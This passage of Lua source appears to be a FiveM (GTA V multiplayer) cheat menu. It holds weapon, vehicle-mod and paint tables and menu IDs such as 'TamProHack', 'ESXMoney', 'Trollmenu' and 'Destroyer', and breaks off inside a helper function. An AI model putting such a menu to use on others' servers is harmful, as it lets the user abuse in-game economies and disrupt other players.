~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}},CarbineRifle={id="weapon_carbinerifle",name="~r~> ~s~Carbine Rifle",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_CARBINERIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_CARBINERIFLE_CLIP_02"},{name="~r~> ~s~Box Magazine",id="COMPONENT_CARBINERIFLE_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MEDIUM"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},CarbineRifleMkII={id="weapon_carbinerifle_mk2",name="~r~> ~s~Carbine Rifle Mk II ",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_CARBINERIFLE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_CARBINERIFLE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_CR_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_CR_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}},AdvancedRifle={id="weapon_advancedrifle",name="~r~> ~s~Advanced Rifle ",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ADVANCEDRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ADVANCEDRIFLE_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_SMALL"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}}}},SpecialCarbine={id="weapon_specialcarbine",name="~r~> ~s~Special Carbine",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SPECIALCARBINE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SPECIALCARBINE_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_SPECIALCARBINE_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MEDIUM"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},SpecialCarbineMkII={id="weapon_specialcarbine_mk2",name="~r~> ~s~Special Carbine Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_SC_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_SC_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}},BullpupRifle={id="weapon_bullpuprifle",name="~r~> ~s~Bullpup Rifle",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_BULLPUPRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_BULLPUPRIFLE_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_SMALL"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},BullpupRifleMkII={id="weapon_bullpuprifle_mk2",name="~r~> ~s~Bullpup Rifle Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Armor Piercing Rounds",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_02_MK2"},{name="~r~> ~s~Medium Scope",id="COMPONENT_AT_SCOPE_SMALL_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_BP_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_BP_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},CompactRifle={id="weapon_compactrifle",name="~r~> ~s~Compact Rifle",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMPACTRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMPACTRIFLE_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_COMPACTRIFLE_CLIP_03"}}}}},LMG={MG={id="weapon_mg",name="~r~> ~s~MG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MG_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_SMALL_02"}}}},CombatMG={id="weapon_combatmg",name="~r~> ~s~Combat MG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMBATMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMBATMG_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MEDIUM"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},CombatMGMkII={id="weapon_combatmg_mk2",name="~r~> ~s~Combat MG Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMBATMG_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMBATMG_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_COMBATMG_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_COMBATMG_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Medium Scope",id="COMPONENT_AT_SCOPE_SMALL_MK2"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_MG_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_MG_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}},GusenbergSweeper={id="weapon_gusenberg",name="~r~> ~s~GusenbergSweeper",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_GUSENBERG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_GUSENBERG_CLIP_02"}}}}},Snipers={SniperRifle={id="weapon_sniperrifle",name="~r~> ~s~Sniper Rifle",bInfAmmo=false,mods={Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_LARGE"},{name="~r~> ~s~Advanced Scope",id="COMPONENT_AT_SCOPE_MAX"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}}}},HeavySniper={id="weapon_heavysniper",name="~r~> ~s~Heavy Sniper",bInfAmmo=false,mods={Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_LARGE"},{name="~r~> ~s~Advanced Scope",id="COMPONENT_AT_SCOPE_MAX"}}}},HeavySniperMkII={id="weapon_heavysniper_mk2",name="~r~> ~s~Heavy Sniper Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_02"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Armor Piercing Rounds",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ"},{name="~r~> ~s~Explosive Rounds",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE"}},Sights={{name="~r~> ~s~Zoom Scope",id="COMPONENT_AT_SCOPE_LARGE_MK2"},{name="~r~> ~s~Advanced Scope",id="COMPONENT_AT_SCOPE_MAX"},{name="~r~> ~s~Nigt Vision Scope",id="COMPONENT_AT_SCOPE_NV"},{name="~r~> ~s~Thermal Scope",id="COMPONENT_AT_SCOPE_THERMAL"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_SR_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_SR_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_SR_SUPP_03"},{name="~r~> ~s~Squared Muzzle Brake",id="COMPONENT_AT_MUZZLE_08"},{name="~r~> ~s~Bell-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_09"}}}},MarksmanRifle={id="weapon_marksmanrifle",name="~r~> ~s~Marksman Rifle",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MARKSMANRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MARKSMANRIFLE_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},MarksmanRifleMkII={id="weapon_marksmanrifle_mk2",name="~r~> ~s~Marksman Rifle Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ  "}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"},{name="~r~> ~s~Zoom Scope",id="COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_MRFL_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_MRFL_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}}},Heavy={RPG={id="weapon_rpg",name="~r~> ~s~RPG",bInfAmmo=false,mods={}},GrenadeLauncher={id="weapon_grenadelauncher",name="~r~> ~s~Grenade Launcher",bInfAmmo=false,mods={}},GrenadeLauncherSmoke={id="weapon_grenadelauncher_smoke",name="~r~> ~s~Grenade Launcher Smoke",bInfAmmo=false,mods={}},Minigun={id="weapon_minigun",name="~r~> ~s~Minigun",bInfAmmo=false,mods={}},FireworkLauncher={id="weapon_firework",name="~r~> ~s~Firework Launcher",bInfAmmo=false,mods={}},Railgun={id="weapon_railgun",name="~r~> ~s~Railgun",bInfAmmo=false,mods={}},HomingLauncher={id="weapon_hominglauncher",name="~r~> ~s~Homing Launcher",bInfAmmo=false,mods={}},CompactGrenadeLauncher={id="weapon_compactlauncher",name="~r~> ~s~Compact Grenade Launcher",bInfAmmo=false,mods={}},Widowmaker={id="weapon_rayminigun",name="~r~> ~s~Widowmaker",bInfAmmo=false,mods={}}},Throwables={Grenade={id="weapon_grenade",name="~r~> ~s~Grenade",bInfAmmo=false,mods={}},BZGas={id="weapon_bzgas",name="~r~> ~s~BZ Gas",bInfAmmo=false,mods={}},MolotovCocktail={id="weapon_molotov",name="~r~> ~s~Molotov Cocktail",bInfAmmo=false,mods={}},StickyBomb={id="weapon_stickybomb",name="~r~> ~s~Sticky Bomb",bInfAmmo=false,mods={}},ProximityMines={id="weapon_proxmine",name="~r~> ~s~Proximity Mines",bInfAmmo=false,mods={}},Snowballs={id="weapon_snowball",name="~r~> ~s~Snowballs",bInfAmmo=false,mods={}},PipeBombs={id="weapon_pipebomb",name="~r~> ~s~Pipe Bombs",bInfAmmo=false,mods={}},Baseball={id="weapon_ball",name="~r~> ~s~Baseball",bInfAmmo=false,mods={}},TearGas={id="weapon_smokegrenade",name="~r~> ~s~Tear Gas",bInfAmmo=false,mods={}},Flare={id="weapon_flare",name="~r~> ~s~Flare",bInfAmmo=false,mods={}}},Misc={Parachute={id="gadget_parachute",name="~r~> ~s~Parachute",bInfAmmo=false,mods={}},FireExtinguisher={id="weapon_fireextinguisher",name="~r~> ~s~Fire Extinguisher",bInfAmmo=false,mods={}}}}
    local FirstJoinProper = false
    local near = false
    local closed = false
    local insideGarage = false
    local currentGarage = nil
    local insidePosition = {}
    local outsidePosition = {}
    local oldrot = nil
    local isPreviewing = false
    local oldmod = -1
    local oldmodtype = -1
    local previewmod = -1
    local oldmodaction = false
    local vehicleMods={{name="Spoilers",id=0},{name="Front Bumper",id=1},{name="Rear Bumper",id=2},{name="Side Skirt",id=3},{name="Exhaust",id=4},{name="Frame",id=5},{name="Grille",id=6},{name="Hood",id=7},{name="Fender",id=8},{name="Right Fender",id=9},{name="Roof",id=10},{name="Vanity Plates",id=25},{name="Trim",id=27},{name="Ornaments",id=28},{name="Dashboard",id=29},{name="Dial",id=30},{name="Door Speaker",id=31},{name="Seats",id=32},{name="Steering Wheel",id=33},{name="Shifter Leavers",id=34},{name="Plaques",id=35},{name="Speakers",id=36},{name="Trunk",id=37},{name="Hydraulics",id=38},{name="Engine Block",id=39},{name="Air Filter",id=40},{name="Struts",id=41},{name="Arch Cover",id=42},{name="Aerials",id=43},{name="Trim 2",id=44},{name="Tank",id=45},{name="Windows",id=46},{name="Livery",id=48},{name="Horns",id=14},{name="Wheels",id=23},{name="Wheel Types",id="wheeltypes"},{name="Extras",id="extra"},{name="Neons",id="neon"},{name="Paint",id="paint"},{name="Headlights Color",id="headlight"},{name="Licence Plate",id="licence"}}
    local perfMods={{name = "~r~Engine", id = 11},{name = "~b~Brakes", id = 12},{name = "~g~Transmission", id = 13},{name = "~y~Suspension", id = 15},{name = "~b~Armor", id = 16},}
    local licencetype={{name="Blue on White 2",id=0},{name="Blue on White 3",id=4},{name="Yellow on Blue",id=2},{name="Yellow on Black",id=1},{name="North Yankton",id=5}}
    local headlightscolor={{name="Default",id=-1},{name="White",id=0},{name="Blue",id=1},{name="Electric Blue",id=2},{name="Mint Green",id=3},{name="Lime Green",id=4},{name="Yellow",id=5},{name="Golden Shower",id=6},{name="Orange",id=7},{name="Red",id=8},{name="Pony Pink",id=9},{name="Hot Pink",id=10},{name="Purple",id=11},{name="Blacklight",id=12}}
    local horns={["Stock Horn"]=-1,["Truck Horn"]=1,["Police Horn"]=2,["Clown Horn"]=3,["Musical Horn 1"]=4,["Musical Horn 2"]=5,["Musical Horn 3"]=6,["Musical Horn 4"]=7,["Musical Horn 5"]=8,["Sad Trombone Horn"]=9,["Classical Horn 1"]=10,["Classical Horn 2"]=11,["Classical Horn 3"]=12,["Classical Horn 4"]=13,["Classical Horn 5"]=14,["Classical Horn 6"]=15,["Classical Horn 7"]=16,["Scaledo Horn"]=17,["Scalere Horn"]=18,["Salemi Horn"]=19,["Scalefa Horn"]=20,["Scalesol Horn"]=21,["Scalela Horn"]=22,["Scaleti Horn"]=23,["Scaledo Horn High"]=24,["Jazz Horn 1"]=25,["Jazz Horn 2"]=26,["Jazz Horn 3"]=27,["Jazz Loop Horn"]=28,["Starspangban Horn 1"]=28,["Starspangban Horn 2"]=29,["Starspangban Horn 3"]=30,["Starspangban Horn 4"]=31,["Classical Loop 1"]=32,["Classical Horn 8"]=33,["Classical Loop 2"]=34}
    local neonColors={["White"]={255,255,255},["Blue"]={0,0,255},["Electric Blue"]={0,150,255},["Mint Green"]={50,255,155},["Lime Green"]={0,255,0},["Yellow"]={255,255,0},["Golden Shower"]={204,204,0},["Orange"]={255,128,0},["Red"]={255,0,0},["Pony Pink"]={255,102,255},["Hot Pink"]={255,0,255},["Purple"]={153,0,153}}
    local paintsClassic={{name="Black",id=0},{name="Carbon Black",id=147},{name="Graphite",id=1},{name="Anhracite Black",id=11},{name="Black Steel",id=2},{name="Dark Steel",id=3},{name="Silver",id=4},{name="Bluish Silver",id=5},{name="Rolled Steel",id=6},{name="Shadow Silver",id=7},{name="Stone Silver",id=8},{name="Midnight Silver",id=9},{name="Cast Iron Silver",id=10},{name="Red",id=27},{name="Torino Red",id=28},{name="Formula Red",id=29},{name="Lava Red",id=150},{name="Blaze Red",id=30},{name="Grace Red",id=31},{name="Garnet Red",id=32},{name="Sunset Red",id=33},{name="Cabernet Red",id=34},{name="Wine Red",id=143},{name="Candy Red",id=35},{name="Hot Pink",id=135},{name="Pfsiter Pink",id=137},{name="Salmon Pink",id=136},{name="Sunrise Orange",id=36},{name="Orange",id=38},{name="Bright Orange",id=138},{name="Gold",id=99},{name="Bronze",id=90},{name="Yellow",id=88},{name="Race Yellow",id=89},{name="Dew Yellow",id=91},{name="Dark Green",id=49},{name="Racing Green",id=50},{name="Sea Green",id=51},{name="Olive Green",id=52},{name="Bright Green",id=53},{name="Gasoline Green",id=54},{name="Lime Green",id=92},{name="Midnight Blue",id=141},{name="Galaxy Blue",id=61},{name="Dark Blue",id=62},{name="Saxon Blue",id=63},{name="Blue",id=64},{name="Mariner Blue",id=65},{name="Harbor Blue",id=66},{name="Diamond Blue",id=67},{name="Surf Blue",id=68},{name="Nautical Blue",id=69},{name="Racing Blue",id=73},{name="Ultra Blue",id=70},{name="Light Blue",id=74},{name="Chocolate Brown",id=96},{name="Bison Brown",id=101},{name="Creeen Brown",id=95},{name="Feltzer Brown",id=94},{name="Maple Brown",id=97},{name="Beechwood Brown",id=103},{name="Sienna Brown",id=104},{name="Saddle Brown",id=98},{name="Moss Brown",id=100},{name="Woodbeech Brown",id=102},{name="Straw Brown",id=99},{name="Sandy Brown",id=105},{name="Bleached Brown",id=106},{name="Schafter Purple",id=71},{name="Spinnaker Purple",id=72},{name="Midnight Purple",id=142},{name="Bright Purple",id=145},{name="Cream",id=107},{name="Ice White",id=111},{name="Frost White",id=112}}
    local paintsMatte={{name="Black",id=12},{name="Gray",id=13},{name="Light Gray",id=14},{name="Ice White",id=131},{name="Blue",id=83},{name="Dark Blue",id=82},{name="Midnight Blue",id=84},{name="Midnight Purple",id=149},{name="Schafter Purple",id=148},{name="Red",id=39},{name="Dark Red",id=40},{name="Orange",id=41},{name="Yellow",id=42},{name="Lime Green",id=55},{name="Green",id=128},{name="Forest Green",id=151},{name="Foliage Green",id=155},{name="Olive Darb",id=152},{name="Dark Earth",id=153},{name="Desert Tan",id=154}}
    local paintsMetal={{name="Brushed Steel",id=117},{name="Brushed Black Steel",id=118},{name="Brushed Aluminum",id=119},{name="Pure Gold",id=158},{name="Brushed Gold",id=159}}
    defaultVehAction = ""
    if GetVehiclePedIsUsing(PlayerPedId()) then
      veh = GetVehiclePedIsUsing(PlayerPedId())
    end

    local Enabled = true
    local HighTachMenu = "TamProHack"
    local TamProHackPRO = "HighTachMenuu"
    local sMX = "SelfMenu"
    local sMXS = "Self Menu"
    local LMX = "LuaMenu"
    local VRPT = "VRPTriggers"
    local TRPM = "TeleportMenu"
    local ESPP = "ESPMENU"
    local AIMENU = "AIMENU"
    local Repair = "Repair"
    local WMPS = "WeaponMenu"
    local MODELS = "MODELS"
    local MODEL = "MODEL"
    local advm = "AdvM"
    local VMS = "VehicleMenu"
    local OPMS = "PlayerMenu"
    local poms = "PlayerOptionsMenu"
    local dddd = "Destroyer"
    local esms = "ESXMoney"
    local crds = "Credits"
    local MSTC = "MiscTriggers"
    local cAoP = "CarOptions"
    local Pure = "ESXPure"
    local Seller = "ESXSeller"
    local MTSS = "MainTrailer"
    local mtsl = "MainTrailerSel"
    local LSCC = "LSC"
    local espa = "ESPMenu"
    local CMSMS = "CsMenu"
    local gccccc = "GCT"
    local GAPA = "GlobalAllPlayers"
    local Tmas = "Trollmenu"
    local ESXC = "ESXCDrugs100%"
    local ESXD = "ESXDrugs"
    local SPD = "SpawnPeds"
    local bmm = "BoostMenu"
    local prof = "performance"
    local tngns = "tunings"
    local GSWP = "GiveSingleWeaponPlayer"
    local WOP = "WeaponOptions"
    local CTS = "CarTypeSelection"
    local CTSmtsps = "MainTrailerSpa"
    local CTSa = "CarTypes"
    local MSMSA = "ModSelect"
    local WTSbull = "WeaponTypeSelection"
    local WTNe = "WeaponTypes"
	local titansentry1 = "Legency"

    local function DrawTxt(text, x, y)
      SetTextFont(1)
      SetTextProportional(1)
      SetTextScale(0.0, 0.6)
      SetTextDropshadow(1, 0, 0, 0, 255)
      SetTextEdge(1, 0, 0, 0, 255)
      SetTextDropShadow()
      SetTextOutline()
      SetTextEntry("STRING")
      AddTextComponentString(text)
      DrawText(x, y)
    end

    function RequestModelSync(mod)
      local model = GetHashKey(mod)
      RequestModel(model)
      while not HasModelLoaded(model) do
        RequestModel(model)
        Citizen.Wait(0)
      end
    end

    function ApplyShockwave(entity)
      local pos = GetEntityCoords(PlayerPedId())
      local coord=GetEntityCoords(entity)
      local dx=coord.x - pos.x
      local dy=coord.y - pos.y
      local dz=coord.z - pos.z
      local distance=math.sqrt(dx*dx+dy*dy+dz*dz)
      local distanceRate=(50/distance)*math.pow(1.04,1-distance)
      ApplyForceToEntity(entity, 1, distanceRate*dx,distanceRate*dy,distanceRate*dz, math.random()*math.random(-1,1),math.random()*math.random(-1,1),math.random()*math.random(-1,1), true, false, true, true, true, true)
    end

    local function DoJesusTick(radius)
      local player = PlayerPedId()
      local coords = GetEntityCoords(PlayerPedId())
      local playerVehicle = GetPlayersLastVehicle()
      local inVehicle=IsPedInVehicle(player,playerVehicle,true)

      DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, 180, 80, 0, 35, false, true, 2, nil, nil, false)

